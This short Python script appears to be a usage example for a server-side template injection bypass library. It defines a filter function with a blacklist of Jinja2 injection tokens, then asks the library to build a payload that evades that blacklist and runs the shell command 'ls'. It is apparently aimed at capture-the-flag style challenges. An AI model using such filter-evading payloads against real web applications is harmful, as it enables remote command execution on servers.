from ssti import shell_cmd
import logging

logging.basicConfig(level = logging.WARNING)

def waf(s: str):
    blacklist = [
        "config", "self", "g", "os", "class", "length", "mro", "base", "request", "lipsum",
        "[", '"', "'", "_", ".", "+", "~", 
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
        "０","１","２","３","４","５","６","７","８","９"
    ]

    for word in blacklist:
        if word in s:
            return False
    return True

payload = shell_cmd(waf, "ls")

print(payload)
